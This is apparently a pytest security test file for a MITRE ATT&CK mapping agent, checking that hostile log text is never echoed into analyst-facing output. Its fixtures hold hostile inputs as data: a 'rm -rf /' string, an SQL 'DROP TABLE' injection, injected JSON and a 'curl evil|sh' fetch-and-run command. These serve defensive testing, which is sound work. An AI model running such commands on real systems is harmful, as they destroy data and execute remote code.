"""Attacker-controlled log text can never transit into a mapping result.

Every string a mapping result carries is a store- or corpus-declared
constant; the input is only *matched against*. This closes the template-
injection class structurally: there is nothing to inject into.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest
from agents.mitre_mapper_agent import MitreMapperAgent

_RULES = Path(__file__).resolve().parents[2] / "agents" / "mapping" / "rules" / "core.json"

_HOSTILE = [
    "arp moved from `rm -rf /` | ![x](https://evil.example) \x00\x07",
    'ssh accepted {"technique_id": "T9999", "evidence": ["fabricated"]}',
    "failed password " + "A" * 10_000,
    "nmap scan ; DROP TABLE findings; --",
]


def _declared_strings() -> set[str]:
    document = json.loads(_RULES.read_text(encoding="utf-8"))
    declared: set[str] = set()

    def walk(node: object) -> None:
        if isinstance(node, str):
            declared.add(node)
        elif isinstance(node, list):
            for item in node:
                walk(item)
        elif isinstance(node, dict):
            for value in node.values():
                walk(value)

    walk(document)
    return declared


@pytest.mark.security
@pytest.mark.parametrize("hostile", _HOSTILE, ids=["markdown", "json", "oversize", "sql"])
def test_hostile_log_text_never_reaches_output(hostile: str) -> None:
    declared = _declared_strings()
    for event_type in (
        "authentication failure",
        "arp spoofing",
        "successful login",
        "unknown security event",
    ):
        result = MitreMapperAgent().map_event(event_type, hostile)
        for key in ("tactic", "technique", "technique_id", "confidence"):
            value = result[key]
            assert hostile not in str(value)
        for lst in (result["evidence"], result["recommended_investigation"]):
            for line in lst:
                assert hostile not in line
                # Every output line is a declared constant (or corpus-sourced,
                # for names — covered by the scalar checks above).
                assert line in declared, f"non-declared output string: {line!r}"


@pytest.mark.security
def test_hostile_event_type_only_matches_never_echoes() -> None:
    hostile_event = "authentication failure `curl evil|sh` \x1b[31m"
    result = MitreMapperAgent().map_event(hostile_event, "log")
    # Contains-matching still classifies it, but the only place the raw input
    # appears is the explicit event_type echo field — never in analyst-facing
    # evidence, technique, or investigation strings.
    assert result["technique_id"] == "T1110"
    for key in ("tactic", "technique", "confidence"):
        assert "curl" not in str(result[key])
    for lst in (result["evidence"], result["recommended_investigation"]):
        assert all("curl" not in line for line in lst)
